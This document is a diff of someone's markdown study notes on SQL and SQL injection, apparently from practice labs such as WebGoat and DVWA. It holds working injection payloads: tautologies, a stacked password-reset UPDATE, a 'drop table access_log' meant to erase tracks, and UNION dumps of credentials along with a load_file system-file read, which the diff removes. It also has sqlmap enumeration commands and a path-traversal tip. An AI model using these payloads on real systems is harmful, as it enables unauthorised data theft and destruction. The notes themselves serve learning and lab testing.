@@ -18,7 +18,7 @@ WHERE CustomerName LIKE ''OR '1'='1';
 
 test' OR 1=1; UPDATE Employees SET password='12345' WHERE first_name='Tom' OR '1'='2 
 
-# substring
+## substring
 Extract 5 characters from the "CustomerName" column, starting in position 1:
  SELECT SUBSTRING(CustomerName, 1, 5) AS ExtractString
 FROM Customers;
@@ -47,7 +47,7 @@ CREATE TABLE employees(
  ``ALTER TABLE employees 
  ADD phone varchar(20)``
 
-# Data Control Language (DCL)
+## Data Control Language (DCL)
 Data control language is used to create privileges to allow users to access and manipulate the database.
 * GRANT - allow users access privileges to the database
 * REVOKE - withdraw users access privileges given by using the GRANT command
@@ -59,22 +59,23 @@ TO operator;
 *Grant the usergroup "UnauthorizedUser" the right to alter tables*
 `GRANT ALTER TABLE TO UnauthorizedUser;`
 
-# special chars
+## special chars
 * `/* */`  are inline comments
 * `-- , #` are line comments
 * `;` allows query chaining `SELECT * FROM users; DROP TABLE users;`
 * `',+,||`	 allows string concatenation
 * `Char()`	 strings without quotes => `SELECT * FROM users WHERE name = '+char(27) OR 1=1`
 
-# Union
-The Union operator is used, to combine the results of two or more SELECT Statements.
+## Union
+The Union operator is used, to combine the results of two or more SELECT Statements. For example getting all cities from two different tables (customers and suppliers, row has to be equal)
 `SELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;`
 
-# Join
+## Join
 Combine rows from two or more tables
-`SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;`
+`SELECT user_data.id, user_data_tan.info FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;`
 
-# start first with
+# hacking
+## start first with
 Try to only put ' or “ in
 try ``'`` in fields to check how it behaves
 
@@ -108,7 +109,7 @@ The underlying SQL query looks like that: `"SELECT * FROM access_log WHERE actio
 //Dripping an access_log table to delete track
 `'; drop table access_log--`
 
-# Blind SQL injection
+### Blind SQL injection
 asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection. So no SQL error message shown.
 
 * we have url: https://my-shop.com?article=4
@@ -121,28 +122,11 @@ asks the database true or false questions and determines the answer based on the
 
 
 
-## enumerate db
+### enumerate db
 ``id=1 order by 1``
 * Then you can enumerate user automatically one by one
 
-## union
-//to get version
-``id=1 union all select 1,2, @@version``
-//to get database user
-``id=1 union all select 1,2, user()``
-
-//to get table schemas and treive some intersting column name
-``id=1 union all select 1,2, table_name from information_schema.tables``
-//column name for instance "users"
-``id=1 union all select 1,2, table_name from information_schema.tables where table_Name='users'``
-
-//we then for instance see columns usernames and passwords, can tackle it with:
-``id=1 union all select 1,username,password from users``
-
-# code execution to read and write files in the system
-``id=1 union all select 1,2, load_file('C:/Windows/System32/drivers/etc/hosts')``
-
-# sqlmap 
+### sqlmap 
 
 ``sqlmap -cookie="security=high; PHPSESSID=a3a6968ac0cb1775f890061af0b42108"" -u “http://192.168.0.6/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#”``
 * to just run in mysql and not maria db
@@ -157,7 +141,7 @@ asks the database true or false questions and determines the answer based on the
 * sql map to find a spefic string in the response "please try to..." and sql attack only username_reg also return DB
 `sqlmap -r request.txt --string "please try to register with a different username" -p username_reg --threads 1`
 
-# Process for sql (automated)
+#### Process for sql (automated)
 1) locate vuln field (check blind sql) or automated (--string is the indicator for "success"): `sqlmap -r /home/kali/Documents/sqlInj2.raw --string "please try to register with a different username" --thread=1` dbms we get from this response
 
 2) get db from the vuln field: `sqlmap -r "/home/kali/Documents/sqlInj.raw" --string "please try to register with a different username" -p username_reg --threads 1 --dbms="HSQLDB" --current-db`
@@ -171,3 +155,10 @@ current database (equivalent to schema on HSQLDB): 'PUBLIC'
 ``sqlmap -r "/home/kali/Documents/sqlInj.raw" --string "please try to register with a different username" -p username_reg --thread=10 --technique=B --dbms="HSQLDB" -D PUBLIC --tables --level=5 --risk=3``
 usually this returns us a table which we can enumerate its rows by f.e.: CHALLENGE_USERS
 `sqlmap -r request.txt --string "please try to register with a different username" -p username_reg --thread=1 --technique=B --dbms="HSQLDB" -D PUBLIC -T CHALLENGE_USERS --columns --level=5 --risk=3`
+
+# Path traversal
+
+for example in file upload try to use on linux `../` to navigate back in the url (might be achievable via POST request).
+
+example: `http://www.test.com?file=../yolo.txt` or encode URL encode it before (even two times)
+
